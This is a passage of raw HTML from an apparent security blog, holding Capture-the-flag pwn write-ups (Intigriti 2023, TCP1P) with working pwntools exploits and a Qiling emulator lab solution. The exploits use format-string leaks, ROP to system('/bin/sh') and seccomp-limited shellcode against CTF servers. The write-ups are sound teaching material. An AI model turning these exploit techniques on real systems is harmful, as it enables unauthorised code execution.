&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;the whole program provide us with several functions , they deal with the our requests with its own rules , the input should be like &lt;code&gt;|{}|{}|{}|&lt;/code&gt;&lt;br&gt;
and for every &lt;code&gt;{}&lt;/code&gt; , there&#39;s a brief explanation:&lt;br&gt;
the first one was used to pass the &lt;code&gt;timestamp&lt;/code&gt; , which is used as the &lt;strong&gt;authentication&lt;/strong&gt; , we need this to bypass those annoying checks&lt;br&gt;
the second one was used as options to enter different functions, ranging from &lt;code&gt;1-4&lt;/code&gt;&lt;br&gt;
the third and the last one , uhh , no use , pass&lt;br&gt;
the main vuln we need to exploit is the buffer overflow in &lt;code&gt;admin_read&lt;/code&gt; function , there is a &lt;code&gt;fread&lt;/code&gt; which will cause a &lt;code&gt;8-bytes&lt;/code&gt; overflow , we could prepare a rop chain on stack and use stack migration to the rop chain we prepared just now&lt;br&gt;
so let&#39;s begin , the following are the main steps (comes out after debugging with gdb):&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;get timestamp and leak address and canary at the same time (there is format string vuln in &lt;code&gt;parse_function&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;as we get the timestamp in step 1 , we use &lt;code&gt;(1&amp;lt;&amp;lt;32)+time_stamp&lt;/code&gt; as our new &lt;code&gt;timestamp&lt;/code&gt; ,  &lt;code&gt;parse_timestamp_new&lt;/code&gt; uses &lt;code&gt;atol&lt;/code&gt; to proceed the &lt;code&gt;timestamp&lt;/code&gt; ,unlike &lt;code&gt;atoi&lt;/code&gt; in &lt;code&gt;parse_timestamp&lt;/code&gt; function , the int overflow will happen in &lt;code&gt;parse_timestamp&lt;/code&gt;  but not in &lt;code&gt;parse_timestamp_new&lt;/code&gt; , therefore we could bypass checks in these two functions.&lt;/li&gt;
&lt;li&gt;after that we enter the &lt;code&gt;admin_read&lt;/code&gt; function , the &lt;code&gt;1-byte&lt;/code&gt; aaw read is actually useless , we only need to focus on the &lt;code&gt;fread&lt;/code&gt; , set up a rop chain on stack and use &lt;code&gt;leave; ret;&lt;/code&gt; to perform a stack migration to the rop chain , then we get root shell&lt;/li&gt;
&lt;/ol&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./RITD&amp;quot;)
io=remote(&amp;quot;ritd.ctf.intigriti.io&amp;quot;,1337)
elf=ELF(&amp;quot;./RITD&amp;quot;)
libc=ELF(&amp;quot;./libc6_2.35-0ubuntu3.1_amd64.so&amp;quot;)

def menu(c0,c1,c2):
    opt=&amp;quot;|{}|{}|{}|&amp;quot;.format(c0,c1,c2)
    ### c0 used as timestamp
    ### c1 1-4
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,opt)

# gdb.attach(io)
# pause()

menu(&#39;1&#39;,&#39;11111111.%77$p.%76$p.%80$p.%75$p&#39;,&#39;1&#39;) #get timestamp
io.recvuntil(b&amp;quot;.&amp;quot;)

base_addr=int(io.recv(14),16)-0x1a45
print(&amp;quot;base_addr: &amp;quot;,hex(base_addr))
menn=base_addr+0x19ab+373
story_addr=base_addr+0x20e3

io.recvuntil(b&amp;quot;.&amp;quot;)
stack_addr=int(io.recv(14),16)
ret_addr=stack_addr-0x48
ptr_addr=ret_addr-0x38
print(&amp;quot;stack_addr: &amp;quot;,hex(stack_addr))
print(&amp;quot;ret_addr: &amp;quot;,hex(ret_addr))
print(&amp;quot;ptr_addr: &amp;quot;,hex(ptr_addr))


io.recvuntil(b&amp;quot;.&amp;quot;)
leak_addr=int(io.recv(14),16)-0x219aa0
print(&amp;quot;leak_addr: &amp;quot;,hex(leak_addr))

shell=leak_addr+0xebdb3
pop_rdi=leak_addr+0x2a3e5
leave_ret=leak_addr+0x0562ec
ret=leak_addr+0x29cd6
str_sh=leak_addr+next(libc.search(b&amp;quot;/bin/sh&amp;quot;))
sys_addr=leak_addr+libc.sym[b&amp;quot;system&amp;quot;]

io.recvuntil(b&amp;quot;.&amp;quot;)
canary=int(io.recv(18),16)
print(&amp;quot;canary: &amp;quot;,hex(canary))

io.recvuntil(b&amp;quot;\n&amp;quot;)
time_stamp=int(io.recvuntil(b&amp;quot;\n&amp;quot;,drop=True),10)
print(&amp;quot;time_stamp: &amp;quot;,time_stamp)

idx=((1&amp;lt;&amp;lt;32)+time_stamp) #overflow 

# menu(idx,&#39;2&#39;,&#39;1&#39;) #check timestamp

# menu(idx,&#39;3&#39;,&#39;1&#39;) # FILE*

# gdb.attach(io)
# pause()

menu(idx,&#39;4&#39;,&#39;1&#39;) # aaw

# gdb.attach(io)
# pause()

io.sendlineafter(b&amp;quot;0x)\n&amp;quot;,hex(ret_addr+0x8)[2:])
io.sendlineafter(b&amp;quot;there?\n&amp;quot;,str(ret_addr))
io.sendafter(b&amp;quot;read?\n&amp;quot;,b&amp;quot;a&amp;quot;*7+p64(ret)+p64(pop_rdi)+p64(str_sh)+p64(sys_addr)+p64(canary)+p64(ret_addr-0x30)+p64(leave_ret))


io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">Intigriti CTF 2023 PWN</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/LIbdQfEF3/"" data-c="
          &lt;h3 id=&#34;前言&#34;&gt;前言：&lt;/h3&gt;
&lt;p&gt;一直以来使用qemu来仿真路由器固件，有时候针对不同固件需要做大量配置文件的修改，并且有时侯我只需要针对某一个服务进行分析&lt;br&gt;
由此萌发了学习qiling框架的念头，一直以来对该框架的跨平台跨架构有所耳闻，劫持系统调用，hook函数也十分方便&lt;br&gt;
本文qilinglab主要就是为熟悉qiling框架而写，程序分别有11个challenge，每完成一个challenge后都会显示solved&lt;/p&gt;
&lt;h3 id=&#34;challenge1&#34;&gt;challenge1：&lt;/h3&gt;
&lt;p&gt;这部分我们需要将&lt;code&gt;0x1337&lt;/code&gt;地址处的值改为&lt;code&gt;1337&lt;/code&gt;&lt;br&gt;
该地址所在内存未被映射&lt;br&gt;
首先我们需要映射一块内存，且需要满足页对齐&lt;br&gt;
然后写入映射内存&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from qiling import *
from qiling.const import *
import sys

def challenge1(ql):  
    ql.mem.map(0x1000,0x1000,info=&#39;challenge1&#39;) #注意内存页对齐
    ql.mem.write(0x1337,ql.pack64(1337))

if __name__ == &amp;quot;__main__&amp;quot;:
    path=[&#39;qilinglab-aarch64&#39;]
	rootfs=&amp;quot;../../rootfs/arm64_linux&amp;quot;
    ql=Qiling(path,rootfs,verbose=QL_VERBOSE.OFF)
    
    challenge1(ql)
    
    ql.run()
    
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge2&#34;&gt;challenge2：&lt;/h3&gt;
&lt;p&gt;该部分挑战调用&lt;code&gt;uname&lt;/code&gt;函数，将相关信息存入一个&lt;code&gt;utsname&lt;/code&gt;的结构体中&lt;br&gt;
我们需要在结构体对应部分（&lt;code&gt;sysname &amp;amp;&amp;amp; version&lt;/code&gt;）写入指定值绕过比较，最后返回正常值来完成挑战&lt;br&gt;
系统调用返回时,结构体相关数据成员的地址可由&lt;code&gt;sp&lt;/code&gt;寄存器值加上偏移得出&lt;br&gt;
在系统调用完之后执行hook函数，&lt;code&gt;QL_INTERCEPT.EXIT&lt;/code&gt;&lt;br&gt;
使用 &lt;code&gt;ql.arch.regs.sp&lt;/code&gt;得到&lt;code&gt;sp&lt;/code&gt;中存储的数据成员地址即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def my_uname_on_exit_hook(ql,*args):
#     struct utsname {
#     char sysname[65];
#     char nodename[65];
#     char release[65];   
#     char version[65];
#     char machine[65];
#     char domainname[65];
# };

    # 00100d88 e1 03 01 91     add        x1,sp,#0x40
    # 00100d8c 21 68 60 38     ldrb       w1,[x1, x0, LSL ]
    # 00100d90 e0 3b 80 b9     ldrsw      x0,[sp, #local_1b8]
    # 00100d94 e2 23 07 91     add        x2,sp,#0x1c8
    # 00100d98 40 68 60 38     ldrb       w0,[x2, x0, LSL ]
    # 00100d9c 3f 00 00 6b     cmp        w1,w0

    sys_addr = ql.arch.regs.sp+0x40
    
    # print(&amp;quot;sys_addr: &amp;quot;,hex(sys_addr))
    
    ql.mem.write(sys_addr,b&amp;quot;QilingOS&amp;quot;)

    # 00100dd8 e1 0f 04 91     add        x1,sp,#0x103
    # 00100ddc 21 68 60 38     ldrb       w1,[x1, x0, LSL ]
    # 00100de0 e0 3f 80 b9     ldrsw      x0,[sp, #local_1b4]
    # 00100de4 e2 63 07 91     add        x2,sp,#0x1d8
    # 00100de8 40 68 60 38     ldrb       w0,[x2, x0, LSL ]
    # 00100dec 3f 00 00 6b     cmp        w1,w0

    version_addr = ql.arch.regs.sp+0x103
    
    # print(&amp;quot;version_addr: &amp;quot;,hex(version_addr))
    
    ql.mem.write(version_addr,b&amp;quot;ChallengeStart&amp;quot;)
    
def challenge2(ql):
    ql.os.set_syscall(&amp;quot;uname&amp;quot;,my_uname_on_exit_hook,QL_INTERCEPT.EXIT)
    
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge3&#34;&gt;challenge3:&lt;/h3&gt;
&lt;p&gt;该部分挑战从&lt;code&gt;/dev/urandom&lt;/code&gt;中先读入&lt;code&gt;0x20&lt;/code&gt;个字节，再读1字节&lt;br&gt;
然后调用&lt;code&gt;getrandom&lt;/code&gt;获取&lt;code&gt;0x20&lt;/code&gt;字节&lt;br&gt;
这里需要让&lt;code&gt;getrandom&lt;/code&gt;获取的&lt;code&gt;0x20&lt;/code&gt;字节与从&lt;code&gt;/dev/urandom&lt;/code&gt;的&lt;code&gt;0x20&lt;/code&gt;字节相同且与开始的1字节不同&lt;br&gt;
我们这里通过自定义文件对象和自己hook一个&lt;code&gt;getrandom&lt;/code&gt;来实现&lt;br&gt;
hook函数对照原函数实现&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1698638869071.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
自定义文件对象是通过&lt;code&gt;QlFsMappedObject&lt;/code&gt;实现的，其中至少需要一个&lt;code&gt;close()&lt;/code&gt;,其他系统调用根据需求，这里我们需要从&lt;code&gt;/dev/urandom&lt;/code&gt;中读入数据到栈上，我们可以自定义一个&lt;code&gt;read&lt;/code&gt;的系统调用，区分单独读入1字节的情况&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class Fake_urandom(QlFsMappedObject):
    def read(self,size):
        if size == 1:
            return b&amp;quot;\x32&amp;quot;
        else:
            return b&amp;quot;\x00&amp;quot;*size
        
    def close(self):
        return 0
    
def getrandom_hook(ql,buf,size,flags):
    ql.mem.write(buf,b&amp;quot;\x00&amp;quot;*size)
    return 0
    
def challenge3(ql):
    ql.add_fs_mapper(&#39;/dev/urandom&#39;,Fake_urandom())
    ql.os.set_syscall(&amp;quot;getrandom&amp;quot;,getrandom_hook)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge4&#34;&gt;challenge4：&lt;/h3&gt;
&lt;p&gt;如图，该循环是不成立的，为了完成challenge4我们需要进入循环中&lt;br&gt;
我们通过hook cmp指令处，使&lt;code&gt;w0&amp;gt;0&lt;/code&gt;即可&lt;br&gt;
在执行cmp这条指令之前我们会调用hook函数，所以最后&lt;code&gt;w0&amp;gt;0&lt;/code&gt;，我们也得以进入该循环&lt;/p&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://oraclepi.tech/post-images/1698638877619.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def hook_cmp_address(ql):
    ql.arch.regs.w0=1

def challenge4(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    cmp_addr=base_addr+0xfe0
    ql.hook_address(hook_cmp_address,cmp_addr)

&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge5&#34;&gt;challenge5:&lt;/h3&gt;
&lt;p&gt;第一个循环赋值&lt;br&gt;
需要绕过第二个循环，最简单方法使&lt;code&gt;rand()&lt;/code&gt;返回值为0即可&lt;br&gt;
之前我们的challenge3是劫持系统调用，该部分我们劫持外部函数，使用&lt;code&gt;ql.os.set_api()&lt;/code&gt;来劫持&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def rand_hook(ql):
    ql.arch.regs.w0=0

def challenge5(ql):
    ql.os.set_api(&amp;quot;rand&amp;quot;,rand_hook)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge6&#34;&gt;challenge6:&lt;/h3&gt;
&lt;p&gt;跳出死循环，跟challenge4一样在cmp之前hook修改寄存器值即可跳出&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def hook_cmp1_address(ql):
    ql.arch.regs.w0=0

def challenge6(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    cmp_addr=base_addr+0x1118
    ql.hook_address(hook_cmp1_address,cmp_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge7&#34;&gt;challenge7:&lt;/h3&gt;
&lt;p&gt;跳出&lt;code&gt;sleep(0xffffffff)&lt;/code&gt;&lt;br&gt;
跟challenge5一样，该部分我们只需劫持&lt;code&gt;sleep&lt;/code&gt;函数调用即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def sleep_hook(ql,*args):
    ql.arch.regs.w0=0
    
def challenge7(ql):
    ql.os.set_api(&amp;quot;sleep&amp;quot;,sleep_hook)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge8&#34;&gt;challenge8：&lt;/h3&gt;
&lt;p&gt;该部分需要我们向&lt;code&gt;check&lt;/code&gt;上写值，确定该地址的方法是通过magic_num去寻找&lt;br&gt;
使用&lt;code&gt;ql.mem.search&lt;/code&gt;，如果找到多个地址，则根据本题距离&lt;code&gt;magic_num_addr-0x8&lt;/code&gt;处的字符串是否为&amp;quot;Random data&amp;quot;来确定，大致结构如下：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;quot;Random data&amp;quot;
magic_num
check
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def magic_hook(ql):
    magic=0x3dfcd6ea00000539
    magic_addrs=ql.mem.search(ql.pack64(magic))
    for i in magic_addrs:
        malloc_addr=i-0x8
        malloc_data=ql.mem.read(malloc_addr,24)
        string_addr,_,check_addr=struct.unpack(&#39;QQQ&#39;,malloc_data)
        ### 这一行将 malloc_data 分成 3个64位8字节无符号整数 传给前面的几个变量
        if ql.mem.string(string_addr) == &#39;Random data&#39;:
            ql.mem.write(check_addr,b&amp;quot;\x01&amp;quot;)
            break
        
def challnege8(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    hook_addr=base_addr+0x11e0
    ql.hook_address(magic_hook,hook_addr)    
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge9&#34;&gt;challenge9:&lt;/h3&gt;
&lt;p&gt;使用&lt;code&gt;ql.os.set_api&lt;/code&gt;来hook函数调用，让&lt;code&gt;tolower&lt;/code&gt;失效即可&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def tolower_hook(ql,*args):
    return
    
def challenge9(ql):
    ql.os.set_api(&amp;quot;tolower&amp;quot;,tolower_hook)
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge10&#34;&gt;challenge10:&lt;/h3&gt;
&lt;p&gt;该部分从&lt;code&gt;/proc/self/cmdline&lt;/code&gt;读入数据并与&lt;code&gt;qilinglab&lt;/code&gt;进行比较&lt;br&gt;
劫持文件系统即可，注意返回值为&lt;code&gt;bytes&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;class Fake_cmdline(QlFsMappedObject):
    def read(self,size):
        return b&amp;quot;qilinglab&amp;quot;
    
    def close(self):
        return 0
    
def challenge10(ql):
    ql.add_fs_mapper(&#39;/proc/self/cmdline&#39;,Fake_cmdline())
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;challenge11&#34;&gt;challenge11:&lt;/h3&gt;
&lt;p&gt;写了两种方法，一种是在指定地址处hook&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def hook_lsr_address(ql):
    ql.arch.regs.x0=0x1337&amp;lt;&amp;lt;0x10

def challenge11(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    lsr_addr=base_addr+0x13f8
    ql.hook_address(hook_lsr_address,lsr_addr)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;还有一种是hook指令，当运行到该条指令时(通过机器码识别指令)，会直接劫持该条指令&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;def hook_mrs_code(ql,address,size):
    if ql.mem.read(address,size) == b&amp;quot;\x00\x00\x38\xd5&amp;quot; :
        ql.arch.regs.x0=0x1337&amp;lt;&amp;lt;0x10
        ql.arch.regs.pc+=4
        

def challenge11_1(ql):
    ql.hook_code(hook_mrs_code)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;由于所有该指令都将被劫持，带来的性能开销比较大，个人比较青睐第一种方法，即hook地址&lt;/p&gt;
&lt;h3 id=&#34;sum&#34;&gt;sum：&lt;/h3&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from qiling import *
from qiling.const import *
from qiling.os.mapper import QlFsMappedObject
import struct
import sys
from udbserver import udbserver

def challenge1(ql):  
    ql.mem.map(0x1000,0x1000,info=&#39;challenge1&#39;) #注意内存页对齐
    ql.mem.write(0x1337,ql.pack64(1337))


def my_uname_on_exit_hook(ql,*args):
#     struct utsname {
#     char sysname[65];
#     char nodename[65];
#     char release[65];   
#     char version[65];
#     char machine[65];
#     char domainname[65];
# };

    # 00100d88 e1 03 01 91     add        x1,sp,#0x40
    # 00100d8c 21 68 60 38     ldrb       w1,[x1, x0, LSL ]
    # 00100d90 e0 3b 80 b9     ldrsw      x0,[sp, #local_1b8]
    # 00100d94 e2 23 07 91     add        x2,sp,#0x1c8
    # 00100d98 40 68 60 38     ldrb       w0,[x2, x0, LSL ]
    # 00100d9c 3f 00 00 6b     cmp        w1,w0

    sys_addr = ql.arch.regs.sp+0x40
    
    # print(&amp;quot;sys_addr: &amp;quot;,hex(sys_addr))
    
    ql.mem.write(sys_addr,b&amp;quot;QilingOS&amp;quot;)

    # 00100dd8 e1 0f 04 91     add        x1,sp,#0x103
    # 00100ddc 21 68 60 38     ldrb       w1,[x1, x0, LSL ]
    # 00100de0 e0 3f 80 b9     ldrsw      x0,[sp, #local_1b4]
    # 00100de4 e2 63 07 91     add        x2,sp,#0x1d8
    # 00100de8 40 68 60 38     ldrb       w0,[x2, x0, LSL ]
    # 00100dec 3f 00 00 6b     cmp        w1,w0

    version_addr = ql.arch.regs.sp+0x103
    
    # print(&amp;quot;version_addr: &amp;quot;,hex(version_addr))
    
    ql.mem.write(version_addr,b&amp;quot;ChallengeStart&amp;quot;)
    
def challenge2(ql):
    ql.os.set_syscall(&amp;quot;uname&amp;quot;,my_uname_on_exit_hook,QL_INTERCEPT.EXIT)
    

class Fake_urandom(QlFsMappedObject):
    def read(self,size):
        if size == 1:
            return b&amp;quot;\x32&amp;quot;
        else:
            return b&amp;quot;\x00&amp;quot;*size
        
    def close(self):
        return 0
    
def getrandom_hook(ql,buf,size,flags):
    ql.mem.write(buf,b&amp;quot;\x00&amp;quot;*size)
    return 0
    
def challenge3(ql):
    ql.add_fs_mapper(&#39;/dev/urandom&#39;,Fake_urandom())
    ql.os.set_syscall(&amp;quot;getrandom&amp;quot;,getrandom_hook)

def hook_cmp_address(ql):
    ql.arch.regs.w0=1

def challenge4(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    cmp_addr=base_addr+0xfe0
    ql.hook_address(hook_cmp_address,cmp_addr)

def rand_hook(ql):
    ql.arch.regs.w0=0

def challenge5(ql):
    ql.os.set_api(&amp;quot;rand&amp;quot;,rand_hook)

def hook_cmp1_address(ql):
    ql.arch.regs.w0=0

def challenge6(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    cmp_addr=base_addr+0x1118
    ql.hook_address(hook_cmp1_address,cmp_addr)

def sleep_hook(ql,*args):
    ql.arch.regs.w0=0
    
def challenge7(ql):
    ql.os.set_api(&amp;quot;sleep&amp;quot;,sleep_hook)

def magic_hook(ql):
    magic=0x3dfcd6ea00000539
    magic_addrs=ql.mem.search(ql.pack64(magic))
    for i in magic_addrs:
        malloc_addr=i-0x8
        malloc_data=ql.mem.read(malloc_addr,24)
        string_addr,_,check_addr=struct.unpack(&#39;QQQ&#39;,malloc_data)
        ### 这一行将 malloc_data 分成 3个64位8字节无符号整数 传给前面的几个变量
        if ql.mem.string(string_addr) == &#39;Random data&#39;:
            ql.mem.write(check_addr,b&amp;quot;\x01&amp;quot;)
            break
        
def challnege8(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    hook_addr=base_addr+0x11e0
    ql.hook_address(magic_hook,hook_addr)            

def tolower_hook(ql,*args):
    return
    
def challenge9(ql):
    ql.os.set_api(&amp;quot;tolower&amp;quot;,tolower_hook)

class Fake_cmdline(QlFsMappedObject):
    def read(self,size):
        return b&amp;quot;qilinglab&amp;quot;
    
    def close(self):
        return 0
    
def challenge10(ql):
    ql.add_fs_mapper(&#39;/proc/self/cmdline&#39;,Fake_cmdline())

def hook_lsr_address(ql):
    ql.arch.regs.x0=0x1337&amp;lt;&amp;lt;0x10

def challenge11(ql):
    base_addr=ql.mem.get_lib_base(ql.path)
    lsr_addr=base_addr+0x13f8
    ql.hook_address(hook_lsr_address,lsr_addr)
    
def hook_mrs_code(ql,address,size):
    if ql.mem.read(address,size) == b&amp;quot;\x00\x00\x38\xd5&amp;quot; :
        ql.arch.regs.x0=0x1337&amp;lt;&amp;lt;0x10
        ql.arch.regs.pc+=4
        

def challenge11_1(ql):
    ql.hook_code(hook_mrs_code)


if __name__ == &amp;quot;__main__&amp;quot;:
    path=[&#39;qilinglab-aarch64&#39;]
    rootfs=&amp;quot;../../rootfs/arm64_linux&amp;quot;
    ql=Qiling(path,rootfs,verbose=QL_VERBOSE.OFF)

    # udbserver(ql.uc,1234,0)
    
    challenge1(ql)
    challenge2(ql)
    challenge3(ql)
    challenge4(ql)
    challenge5(ql)
    challenge6(ql)
    challenge7(ql)
    challnege8(ql)
    challenge9(ql)
    challenge10(ql)
    challenge11(ql)
    # challenge11_1(ql)
    
    ql.run()
    
&lt;/code&gt;&lt;/pre&gt;
">qiling_lab_aarch64</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/UPbwsdUDa/"" data-c="
          &lt;h3 id=&#34;pwn&#34;&gt;PWN:&lt;/h3&gt;
&lt;h4 id=&#34;bluffer-overflow&#34;&gt;bluffer Overflow:&lt;/h4&gt;
&lt;p&gt;provide us with c source code,just use gcc to compile and the offset to the addr we need to write was &lt;code&gt;0x14&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,17027)
# elf=ELF(&amp;quot;./chall&amp;quot;)

payload=b&amp;quot;\x00&amp;quot;*0x14+p64(0x4e5750)
io.sendlineafter(b&amp;quot;Input: &amp;quot;,payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;babyheap&#34;&gt;babyheap:&lt;/h4&gt;
&lt;p&gt;when we call &lt;code&gt;read_flag&lt;/code&gt;, it will &lt;code&gt;malloc(0x70)*7&lt;/code&gt;&lt;br&gt;
just make sure u have spare tcachebin before u call &lt;code&gt;read_flag&lt;/code&gt;&lt;br&gt;
then u can leak flag by &lt;code&gt;view&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./chall&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,4267)
elf=ELF(&amp;quot;./chall&amp;quot;)

def add(n,s,cc):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;Size: &amp;quot;,str(s))
    io.sendlineafter(b&amp;quot;Content: &amp;quot;,cc)
    
def delete(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
def show(n):
    io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;3&amp;quot;)
    io.sendlineafter(b&amp;quot;Index: &amp;quot;,str(n))
    
# gdb.attach(io)
# pause()    

for i in range(1,7):
    add(i,0x70,b&amp;quot;aaa&amp;quot;)

for i in range(1,7):
    delete(i)

io.sendlineafter(b&amp;quot;&amp;gt; &amp;quot;,b&amp;quot;4&amp;quot;)

show(2)
    
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;message&#34;&gt;message:&lt;/h4&gt;
&lt;p&gt;program run our shellcode with seccomp rules added&lt;br&gt;
&lt;code&gt;seccomp-tools dump ./chall&lt;/code&gt; and we get&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;fk@fk-pop:~/文档/match/tcp1p/message$ seccomp-tools dump ./chall
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A &amp;lt; 0x40000000) goto 0005
 0004: 0x15 0x00 0x05 0xffffffff  if (A != 0xffffffff) goto 0010
 0005: 0x15 0x03 0x00 0x00000000  if (A == read) goto 0009
 0006: 0x15 0x02 0x00 0x00000001  if (A == write) goto 0009
 0007: 0x15 0x01 0x00 0x00000002  if (A == open) goto 0009
 0008: 0x15 0x00 0x01 0x000000d9  if (A != getdents64) goto 0010
 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0010: 0x06 0x00 0x00 0x00000000  return KILL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;which allows &lt;code&gt;getdents64,open,read,write&lt;/code&gt;&lt;br&gt;
the flag name was not &lt;code&gt;flag&lt;/code&gt; anymore,we need to use &lt;code&gt;getdents64&lt;/code&gt; to list all files in current directory&lt;br&gt;
then normal orw shellcode is ok&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,os=&#39;linux&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])


# io=process(&amp;quot;./chall&amp;quot;)
io=remote(&amp;quot;ctf.tcp1p.com&amp;quot;,8008)

# gdb.attach(io.pid)
# pause()

io.recvuntil(b&amp;quot;me? \n&amp;quot;)

# list current directory files
# payload = asm(&#39;mov rsp,QWORD PTR fs:[0]&#39;)
# payload += asm(shellcraft.open(&#39;.&#39;))
# payload += asm(shellcraft.getdents64(3, &#39;rsp&#39;, 0x500))
# payload += asm(shellcraft.write(1, &#39;rsp&#39;, 0x500))

# orw flag
payload=asm(shellcraft.open(&amp;quot;flag-3462d01f8e1bcc0d8318c4ec420dd482a82bd8b650d1e43bfc4671cf9856ee90.txt&amp;quot;))
payload+=asm(shellcraft.read(3,&#39;rsp&#39;,0x100))
payload+=asm(shellcraft.write(1,&#39;rsp&#39;,0x100))


io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;gamechanger&#34;&gt;gamechanger:&lt;/h4&gt;
&lt;p&gt;pie enabled,full relro&lt;br&gt;
ezbypass the random number&lt;/p&gt;
&lt;p&gt;then we have a chance to overflow，the first time we could partial write the ret addr&lt;br&gt;
made it to  &lt;code&gt;_start&lt;/code&gt; ,meanwhile ,due to the &lt;code&gt;printf&lt;/code&gt; we could leak the base addr at the same time&lt;/p&gt;
&lt;p&gt;the second time we enter &lt;code&gt;ask&lt;/code&gt; ,we overflow the ret addr to &lt;code&gt;puts&lt;/code&gt; func,this could print the addr of &lt;code&gt;__funlockfile&lt;/code&gt; ,which we can infer libc base according to this ,ret addr+0x8 to &lt;code&gt;ask&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;as we got all the addr we need,then the last time we just use normal rop&lt;br&gt;
I&#39;ve tried ogg but it doesn&#39;t work on my local&lt;br&gt;
